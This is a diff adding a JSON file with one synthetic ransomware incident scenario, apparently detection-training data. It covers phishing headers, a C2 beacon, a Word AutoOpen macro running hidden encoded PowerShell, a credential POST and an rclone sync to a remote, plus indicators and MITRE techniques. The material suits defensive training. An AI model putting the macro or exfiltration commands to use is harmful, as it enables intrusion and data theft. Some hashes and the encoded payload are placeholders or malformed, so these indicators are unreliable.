@@ -1,0 +1,124 @@
+{
+  "examples": [
+    {
+      "scenario": "Ransomware-as-a-Service affiliate gains initial foothold via spear-phishing, executes double-extortion ransomware payload with C2 beaconing, and encrypts critical enterprise file shares.",
+      "technical_data": {
+        "phishing_email": {
+          "raw_headers": "Return-Path: <invoices@securepay-portal.com>\r\nReceived: from mail.securepay-portal.com (mail.securepay-portal.com [198.51.100.23])\r\n\tby mail.enterprise.local (Postfix) with ESMTP id 3EFD23456B\r\n\tfor <victim@enterprise.local>; Tue, 16 May 2023 11:25:43 +0000 (UTC)\r\nDKIM-Signature: v=1; a=rsa-sha256; d=securepay-portal.com; s=default; c=relaxed/relaxed;\r\n\tbh=+s3XkRzY+T3mVq7y+P6P2xNq8MqF6Q0XhMZxP7cPz+E=;\r\n\tb=Qz1zXwl1aCtNGYzJ+7kX8+Airi9bJ0P2JX9cW8vQn5i9VbYkq9qkJ5Zp3H3L1+H6i\r\n\t4lB8Z5uaiQZ5vJqk1NlpOfp2hO3t3YhQkLqI8xL3lD1L1wC5h5V3xR1W9KqQ==\r\nX-Originating-IP: [203.0.113.45]\r\nX-Mailer: Microsoft Outlook 16.0\r\nSubject: Urgent: Invoice #INV-2023-4598 Attached\r\nTo: victim@enterprise.local\r\nFrom: \"SecurePay Billing\" <invoices@securepay-portal.com>\r\nMessage-ID: <CAJ3G9pNodfB7rFJkL9Yf5d+J8fOmqZkP1t+Q@mail.securepay-portal.com>\r\nDate: Tue, 16 May 2023 11:25:40 +0000",
+          "body": "Dear Customer,\r\n\r\nPlease find attached the invoice #INV-2023-4598 for your recent transaction.\r\nKindly review and process the payment at your earliest convenience.\r\n\r\nBest Regards,\r\nSecurePay Billing Team\r\n\r\nAttachment: Invoice_INV-2023-4598.docm",
+          "attachment_hashes": {
+            "MD5": "5f4dcc3b5aa765d61d8327deb882cf99",
+            "SHA-256": "d2d2d2b2e3c1a4c5e6f7d8e9a1b2c3d4e5f67890abcdef1234567890abcdef12"
+          },
+          "smtp_transaction": [
+            "220 mail.securepay-portal.com ESMTP Postfix",
+            "EHLO mail.enterprise.local",
+            "250-mail.securepay-portal.com",
+            "250-PIPELINING",
+            "250-SIZE 10240000",
+            "250-ETRN",
+            "250-AUTH PLAIN LOGIN",
+            "250-ENHANCEDSTATUSCODES",
+            "250-8BITMIME",
+            "250 DSN",
+            "MAIL FROM:<invoices@securepay-portal.com>",
+            "250 2.1.0 Ok",
+            "RCPT TO:<victim@enterprise.local>",
+            "250 2.1.5 Ok",
+            "DATA",
+            "354 End data with <CR><LF>.<CR><LF>",
+            "[email data...]",
+            ".",
+            "250 2.0.0 Ok: queued as 3EFD23456B",
+            "QUIT",
+            "221 2.0.0 Bye"
+          ]
+        },
+        "network_traffic": {
+          "http_request": "POST /upload.php HTTP/1.1\r\nHost: 198.51.100.23\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 104\r\n\r\nusername=victim&password=SecurePass123&filedata=%4D%5A%90%00%03%00%00%00%04%00%00%00ffff",
+          "dns_queries": [
+            "Timestamp: 2023-05-16T11:40:01Z Query: ransom-c2[.]darknetops[.]top Type: A Response: 198.51.100.23",
+            "Timestamp: 2023-05-16T11:41:12Z Query: ransom-c2[.]darknetops[.]top Type: TXT Response: \"v=spf1 include:_spf.protection.outlook.com ~all\""
+          ],
+          "c2_beacon": [
+            "GET /api/v1/status?system=win10&user=victim HTTP/1.1",
+            "Host: ransom-c2.darknetops.top",
+            "User-Agent: Mozilla/5.0",
+            "Accept: application/json",
+            "Connection: keep-alive"
+          ],
+          "ransomware_payload": {
+            "file_name": "invoice_macro_dropper.docm",
+            "file_hashes": {
+              "MD5": "5f4dcc3b5aa765d61d8327deb882cf99",
+              "SHA-1": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
+              "SHA-256": "d2d2d2b2e3c1a4c5e6f7d8e9a1b2c3d4e5f67890abcdef1234567890abcdef12"
+            },
+            "macro_code_snippet": "Sub AutoOpen()\r\n   Shell \"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAtAGYAbwByAGMAZQAgAGYAbABhZyAgAGkAZgAgACgAKABbAFMAaABlAGwAbABdACkAIAB7ACAAJABmID0gJwBoAHQAdABwADoALwAvAGgAdAB0AHAAcwA6AC8ALwBkAGF0AGEALgBkAG8AbQBhAGkAbgAuAGMAbwBtAC8AZgBpAGwAZQAuAGV4AGUALgBlAHgAZQAnAAoAIAAgACQAbgAgPSAgACQAZgAuAFsAVABhAHIAZwBlAHQAXQAuAE8AcwAuAEYAbABhAGcAcwBbACcAZgAGAA0ACgAgACQALgAuAFMAZQBuAGQAVABvACAAVwBlAGIAUwBjAHIAaQBwAHQAcAAoACkKACAAACAAACAAfQogAGVuAGQAVQBwAG8AcgB0ACgK",
+            "registry_changes": [
+              "HKCU\\Software\\Microsoft\\Office\\Word\\Security\\AccessVBOM = 1",
+              "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\RansomDropper = \"C:\\Users\\victim\\AppData\\Roaming\\invoice_macro_dropper.docm\""
+            ],
+            "file_system_changes": [
+              "C:\\Users\\victim\\Documents\\Encrypted\\README_RECOVERY.txt created",
+              "Encrypted file extensions changed to .locked"
+            ]
+          },
+          "process_execution_chain": [
+            "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAtAGYAbwByAGMAZQAgAGYAbABhZyA=",
+            "ransomware.exe --encrypt --target C:\\EnterpriseShare",
+            "rclone.exe sync C:\\Encrypted backup-remote:corp-backups"
+          ],
+          "memory_dump_snippet": "0x7fffdf30: 72 61 6e 73 6f 6d 65 77 61 72 65 20 6c 6f 61 64  ransomware load\n0x7fffdf40: 65 64 20 61 6e 64 20 65 6e 63 72 79 70 74 69 6f  ed and encryptio\n0x7fffdf50: 6e 20 69 6e 20 70 72 6f 67 72 65 73 73 0a         n in progress."
+        },
+        "logs": {
+          "windows_event_log": [
+            "LogName=Security Source=Microsoft-Windows-Security-Auditing EventID=4688 TaskCategory=Process Creation Level=Information Keywords=Audit Success",
+            "New Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "Command Line: powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAtAGYAbwByAGMAZQAgAGYAbABhZyA="
+          ],
+          "file_access_log": [
+            "2023-05-16T11:45:12.234Z - Opened file: \\\\EnterpriseShare\\Finance\\Q2_reports.xlsx",
+            "2023-05-16T11:45:14.987Z - File encrypted: \\\\EnterpriseShare\\Finance\\Q2_reports.xlsx.locked"
+          ],
+          "ids_alerts": [
+            "Timestamp=2023-05-16T11:40:03Z Signature=ET TROJAN Powershell EncodedCommand Execution SID=1001 Priority=1 src_ip=10.10.10.45 dst_ip=198.51.100.23 src_port=54321 dst_port=80"
+          ]
+        }
+      },
+      "indicators": {
+        "domains": [
+          "securepay-portal.com",
+          "ransom-c2.darknetops.top"
+        ],
+        "file_hashes": [
+          "5f4dcc3b5aa765d61d8327deb882cf99",
+          "d2d2d2b2e3c1a4c5e6f7d8e9a1b2c3d4e5f67890abcdef1234567890abcdef12"
+        ],
+        "processes": [
+          "powershell.exe -EncodedCommand",
+          "ransomware.exe",
+          "rclone.exe"
+        ],
+        "registry_keys": [
+          "HKCU\\Software\\Microsoft\\Office\\Word\\Security\\AccessVBOM",
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\RansomDropper"
+        ],
+        "network_ips": [
+          "198.51.100.23",
+          "203.0.113.45"
+        ]
+      },
+      "detection_method": "Detection leveraged EDR telemetry capturing suspicious PowerShell encoded command execution, anomalous file rename and extension changes on network shares, registry autorun modifications, and network IDS alerts for known ransomware C2 domains with HTTP beaconing patterns. Offline backup validation detected missing recent files. Network segmentation alerts triggered on lateral file share access outside the user baseline.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Phishing: Spearphishing Attachment",
+        "T1204.002 - User Execution: Malicious File",
+        "T1059.001 - Command and Scripting Interpreter: PowerShell",
+        "T1486 - Data Encrypted for Impact",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
+        "T1021.002 - Remote Services: SMB/Windows Admin Shares"
+      ]
+    }
+  ]
+}
